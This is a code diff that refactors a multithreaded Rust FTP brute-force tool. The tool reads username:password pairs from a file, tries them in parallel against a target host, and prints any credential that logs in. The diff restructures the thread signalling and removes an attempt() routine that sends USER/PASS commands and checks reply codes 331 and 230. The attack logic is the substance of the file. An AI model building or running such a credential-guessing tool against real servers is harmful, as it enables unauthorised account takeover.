@@ -36,20 +36,20 @@ struct Parsed_Args {
 
 
 
-trait Connect_To_Server {
-    fn new(host: String) -> Self;
+trait Connect_To_Server<'a> {
+    fn new(host: &'a String) -> Self;
     fn send(&self,credential: &str, stream: &mut TcpStream, sender: &Sender<u32>) -> Result<u8>;
     fn can_connect(&self,stream: &mut TcpStream) -> bool;
     fn connect_tcp(&self) -> TcpStream;
 }
 
-struct Server{
-    host: String
+struct Server<'a>{
+    host: &'a String
 }
 
-impl Connect_To_Server for Server {
-    fn new(host: String) -> Self {
-        Server {
+impl<'a> Connect_To_Server<'a> for Server<'a> {
+    fn new(host: &'a String) -> Self {
+        Server::<'a> {
         host:host}
     }
 
@@ -126,33 +126,26 @@ fn main() -> Result<()> {
 
     let now = Instant::now();
     let pool = ThreadPool::new(4);
-    let pair = Arc::new((Mutex::new(false), Condvar::new()));
+    let manage_threads = HandleThreads::new();
     let (sender, receiver): (Sender<u32>, Receiver<u32>) = channel();
-    // loop over chunk
-    for cred_chunk in chunks {
-        // let cloned_host = host.clone();
-        let pair2 = pair.clone();
-        let sender = sender.clone();
-        let host = host.clone();
 
-        // give chunks to threads
+    for cred_chunk in chunks {
+        let host = host.clone();
+        let sender = sender.clone();
+        let manage_threads = manage_threads.clone();
         pool.execute(move || {
-            let server = Server{host:host.clone()};
-            let cred_chunk = cred_chunk.clone();
+            let server = Server{host:&host};
+            // let cred_chunk = cred_chunk.clone();
             let mut stream = server.connect_tcp();
             if server.can_connect(&mut stream) {
-                for cred in &cred_chunk {
+                for cred in &cred_chunk.clone() {
                     match server.send(cred, &mut stream, &sender) {
-                        Ok(code) => {
+                        Ok(code) => { 
                             if code == 1 {
                                 println!("------------- SUCCESS -------------");
                                 println!("{}", cred);
                                 println!("------------- SUCCESS -------------");
-                                let &(ref lock, ref cvar) = &*pair2;
-                                let mut done = lock.lock().unwrap();
-                                *done = true;
-                                // We notify the condvar that the value has changed.
-                                cvar.notify_one();
+                                manage_threads.finish_work();
                             }
                         }
                         Err(err) => {
@@ -167,12 +160,7 @@ fn main() -> Result<()> {
             }
         })
     }
-    // wait for the thread to start up
-    let &(ref lock, ref cvar) = &*pair;
-    let mut done = lock.lock().unwrap();
-    while !*done {
-        done = cvar.wait(done).unwrap();
-    }
+    manage_threads.start_work();
     println!("Total attempts {}", receiver.try_iter().count());
     println!("Total time elapsed: {}", now.elapsed().as_secs());
     Ok(())
@@ -186,26 +174,6 @@ fn read_file_lines(file_name: &str) -> Vec<String> {
     let contents = read_to_string(&file_name)
         .unwrap_or_else(|_| panic!("Error reading from file {}", file_name));
     return contents.lines().map(|line| line.to_string()).collect();
-}
-
-fn attempt(credential: &str, stream: &mut TcpStream, sender: &Sender<u32>) -> Result<u8> {
-    if let [username, password] = &credential.split(':').take(2).collect::<Vec<&str>>()[..] {
-        sender.send(1);
-        println!("attempting: {} {}", username, password);
-        stream.write(format!("USER {}\r\n", username).as_bytes())?;
-        let mut buffer = [0; MAX_MESSAGE_SIZE];
-        stream.read(&mut buffer)?;
-        // code 331 (User name okay, need password)
-        if buffer[..3] == [51, 51, 49] {
-            stream.write(format!("PASS {}\r\n", password).as_bytes())?;
-            stream.read(&mut buffer)?;
-            // code 230 (User logged in, proceed. Logged out if appropriate)
-            if buffer[..3] == [50, 51, 48] {
-                return Ok(1);
-            }
-        }
-    }
-    return Ok(0);
 }
 
 
@@ -272,3 +240,40 @@ fn attempt(credential: &str, stream: &mut TcpStream, sender: &Sender<u32>) -> Re
 //     // }
 
 // }
+#[derive(Clone)]
+struct HandleThreads {
+    pair: Arc<(Mutex<bool>,Condvar)>,
+}
+
+
+trait ManageThreads {
+    fn new() -> Self;
+    fn finish_work(&self) -> bool;
+    fn start_work(&self) -> bool;
+}
+
+
+impl ManageThreads for HandleThreads {
+    fn new() -> Self {
+        HandleThreads { pair:  Arc::new((Mutex::new(false), Condvar::new())) }
+    }
+
+    fn start_work(&self) -> bool {
+        let &(ref lock, ref cvar) = &*self.pair;
+        let mut done = lock.lock().unwrap();
+        while !*done {
+            done = cvar.wait(done).unwrap();
+        }
+        return true
+    }
+
+    fn finish_work(&self) -> bool {
+        let &(ref lock, ref cvar) = &*self.pair.clone();
+        let mut done = lock.lock().unwrap();
+        *done = true;
+        // We notify the condvar that the value has changed.
+        cvar.notify_one();
+        return true
+    }
+}
+
